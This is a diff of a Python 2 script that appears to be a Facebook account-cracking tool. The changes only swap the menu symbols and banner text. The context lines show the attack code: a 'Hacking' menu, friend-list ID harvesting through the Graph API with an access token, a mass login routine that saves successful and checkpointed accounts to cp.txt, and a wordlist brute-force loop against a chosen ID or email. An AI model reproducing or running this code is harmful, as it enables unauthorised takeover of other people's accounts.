@@ -95,11 +95,11 @@ Password = "968ⁿ"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[\x1b[1;93m☆\x1b[1;96m] \x1b[1;31mUsername\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
+    username = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mUsername\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
     if (username == Username):
-    	password = raw_input("\033[1;96m[\x1b[1;93m☆\x1b[1;96m] \x1b[1;31mPassword\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
+    	password = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mPassword\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
         if (password == Password):
-            print "ok ✅" + username
+            print "ok " + username
             loop = 'false'
         else:
             print "Eeror"
@@ -118,8 +118,8 @@ def login():
 		print logo
 		print 42*"\033[1;96m="
 		print('\033[1;96m[☆] \x1b[1;91mADD new Facebook \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
+		id = raw_input('\033[1;96m[∞] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[∞] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -201,7 +201,7 @@ def menu():
 	print "----------------------------------------------------"
 	print "\033[1;32;40m[1] \033[1;33;40m<1>Hacking"	
 	print "\033[1;32;40m[2] \033[1;33;40m<2>updating"																														
-	print "\033[1;32;40m[0] \033[1;33;40m<3> log out Account"
+	print "\033[1;32;40m[0] \033[1;33;40m<0> log out Account"
 	pilih()
 
 def pilih():
@@ -242,7 +242,7 @@ def super():
 	print "\x1b[1;32;40m[2] \033[1;33;40m<2>ID Globall"
 	print "\x1b[1;32;40m[3] \033[1;33;40m<3>Wordlist"
 	print "\x1b[1;32;40m[4] \033[1;33;40m<4>File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m<5>Back"
+	print "\x1b[1;32;40m[0] \033[1;33;40m<0>Back"
 	pilih_super()
 
 def pilih_super():
@@ -263,16 +263,16 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;96m[*] ID: ")
+		idt = raw_input("\033[1;96m[∞] Total ID: ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;31;40m[✺] Name : "+op["name"]
+			print"\033[1;31;40m[∞] Name : "+op["name"]
 		except KeyError:
-			print"\x1b[1;92m[✺] ID Eeror!"
+			print"\x1b[1;92m[∞] ID Eeror!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;40m[✺] wait..."
+		print"\033[1;35;40m[∞] wait..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -299,13 +299,13 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] total ID : \033[1;94m"+str(len(id))
-	jalan('\033[1;34;40m[✺] plz wait ...')
+	print "\033[1;36;40m[∞] total ID : \033[1;94m"+str(len(id))
+	jalan('\033[1;34;40m[∞] plz wait ...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Loading\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "/////////////////////////////////"
-	print "()()()()()()()()()()()()()()()()()()()()()()()()()"
+		print("\r\033[1;32;40m[∞] Loading\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print ":)"
+	print "<$😋>"
 
 	jalan('          \033[1;91mLoading.....10min.15min.ok....')
 	print  "---------------------------------------------------" 
@@ -491,8 +491,8 @@ def pilih_super():
 	p.map(main, id) 
 	
 	print '[✓]....'
-	print "[+)(+] \033[1;32;40mVery.GOOD\033[1;36;40m/\033[1;31;40msorry.CHECKPOINT \033[1;36;40m: \033[1;32;40m"+str(len(oks))+"\033[1;36;40m/\033[1;31;40m"+str(len(cekpoint))
-	print '\033[1;34;40m[+] ∞✓∅✓✓✓✓✓ : save/cp.txt'
+	print "[+)∞(+] \033[1;32;40mVery.GOOD\033[1;36;40m/\033[1;31;40msorry.CHECKPOINT \033[1;36;40m: \033[1;32;40m"+str(len(oks))+"\033[1;36;40m/\033[1;31;40m"+str(len(cekpoint))
+	print '\033[1;34;40m[+] ✓∅✓✓✓✓✓ : save/cp.txt'
 	print """-------------------------------"""
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	super()
@@ -511,13 +511,13 @@ def brute():
         print logo
         print '--------------------------------------------'
         try:
-            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97m✓✓✓--> \x1b[1;91m:\x1b[1;97m ')
-            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist✓<?> \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            email = raw_input('\x1b[1;91m[∞] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97m✓✓✓--> \x1b[1;91m:\x1b[1;97m ')
+            passw = raw_input('\x1b[1;91m[∞] \x1b[1;92mWordlist✓<?> \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
             print '---------------------------------'
             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92m✓✓✓<?> \x1b[1;91m:\x1b[1;97m ' + email
-            print '\x1b[1;91m[+] \x1b[1;92mAll\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword!?'
+            print '\x1b[1;91m[∞] \x1b[1;92mAll\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword!?'
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplz wait \x1b[1;97m...')
             sandi = open(passw, 'r')
             for pw in sandi:
